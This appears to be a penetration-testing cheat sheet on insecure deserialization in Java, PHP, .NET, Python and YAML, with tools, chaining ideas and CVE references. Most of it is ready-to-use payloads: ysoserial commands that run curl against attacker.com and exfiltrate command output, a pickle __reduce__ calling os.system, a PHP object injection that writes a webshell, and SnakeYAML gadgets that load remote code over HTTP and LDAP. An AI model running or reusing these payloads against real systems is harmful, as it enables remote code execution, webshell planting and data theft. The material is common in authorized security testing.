# Deserialization Techniques

> Insecure deserialization — when untrusted data is used to reconstruct objects, allowing attackers to trigger arbitrary code execution via gadget chains.

## Surface

- Java: `ObjectInputStream.readObject()` — cookies, JMX, RMI, custom protocols
- PHP: `unserialize()` — session data, cookies, API params
- .NET: `BinaryFormatter`, `XmlSerializer`, `DataContractSerializer` — SOAP, ViewState
- Python: `pickle.loads()` — ML model endpoints, job queues, session stores
- Ruby: `Marshal.load()` — Rails session cookies (pre-5.2), Sidekiq job args
- Node.js: `node-serialize`, `funcster`, `serialize-javascript` — JSON-adjacent
- YAML: `yaml.load()` (PyYAML pre-5.1), SnakeYAML — anywhere YAML is parsed

## Test Approach

1. **Identify serialized data** — look for:
   - Base64 blobs in cookies: `rO0AB` prefix = Java serialized
   - `a:3:{s:4:...}` = PHP serialized
   - `AAEAAAD` = .NET BinaryFormatter
   - `\x80\x04\x95` = Python pickle
   - `---\n` or `!!python/object:` = YAML

2. **Java deserialization** — generate gadget chain with ysoserial:
   ```
   java -jar ysoserial.jar CommonsCollections6 'curl attacker.com/rce' | base64 -w 0
   ```
   Inject into cookie/header, trigger deserialization endpoint.

3. **PHP object injection** — find a `__wakeup()` or `__destruct()` with dangerous logic; craft magic method chain:
   ```php
   O:8:"UserPref":2:{s:4:"path";s:21:"/var/www/html/cmd.php";s:7:"content";s:17:"<?php system($_GET['c']); ?>";}
   ```

4. **.NET ViewState** — check if MAC validation disabled: decode base64, edit, re-encode; or use ysoserial.net:
   ```
   ysoserial.exe -p ViewState -g TypeConfuseDelegate -c "calc.exe" --validationalg="SHA1" --validationkey="<key>"
   ```

5. **Python pickle** — craft malicious pickle payload:
   ```python
   import pickle, os
   class Exploit(object):
       def __reduce__(self):
           return (os.system, ('curl attacker.com/rce',))
   payload = pickle.dumps(Exploit())
   ```

6. **YAML** — SnakeYAML RCE:
   ```yaml
   !!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://attacker.com/payload.jar"]]]]
   ```

7. **Blind OOB detection** — use Interactsh for DNS callback in gadget chain:
   ```
   java -jar ysoserial.jar URLDNS "http://attacker.interactsh.com" | base64 -w 0
   ```

## Tools

- **ysoserial** — Java gadget chains: CommonsCollections1-7, Spring, Hibernate, etc.
- **ysoserial.net** — .NET BinaryFormatter/ViewState gadget chains
- **PHPGGC** — PHP gadget chain generator: `phpggc -l` lists available chains
- **Interactsh** — OOB DNS/HTTP for blind deserialization detection
- **nuclei** — deserialization detection templates

## Payloads / Probes

```
# Java - CommonsCollections6 (no @6 requirement)
java -jar ysoserial.jar CommonsCollections6 'curl http://attacker.com/$(id)' | base64 -w 0

# PHP - simple object injection skeleton
O:9:"EvilClass":1:{s:3:"cmd";s:2:"id";}

# Python pickle RCE
import pickle, base64, os
class RCE:
    def __reduce__(self):
        return (os.system, ('id > /tmp/pwned',))
print(base64.b64encode(pickle.dumps(RCE())).decode())

# YAML SnakeYAML
!!com.sun.rowset.JdbcRowSetImpl
  dataSourceName: "ldap://attacker.com/exploit"
  autoCommit: true
```

## Chain Opportunities

- **Deserialization → RCE** — gadget chain triggers OS command execution
- **Deserialization → SSRF** — URLDNS gadget forces DNS lookup to probe internals
- **Deserialization → file write** — write webshell to web root
- **PHP deserialization + POP chain → SQLi** — `__toString()` triggers query with attacker data
- **.NET ViewState deserialization → Windows shell** — SYSTEM-level if app pool runs elevated

## Recent Intel

- **CVE-2023-3519** · Citrix ADC/NetScaler unauthenticated deserialization via NSCIService/AAA XML API → full system RCE, affects 13.1-13.1-49.16 · https://www.assetnote.io/resources/research/analysis-of-cve-2023-3519-in-citrix-adc-and-netscaler-gateway
- **CVE-2023-24489** · Citrix ShareFile pre-auth .NET XML deserialization in `UploadClientModule.asmx`, `ObjectDataProvider` gadget chain · https://www.assetnote.io/resources/research/advisory-sharefile-pre-auth-rce-cve-2023-24489
- **CVE-2023-38646** · Metabase H2 JDBC INIT parameter — SQL-to-Java deserialization bridge, pre-auth on `/api/setup/validate` · https://www.assetnote.io/resources/research/chaining-our-way-to-pre-auth-rce-in-metabase-cve-2023-38646
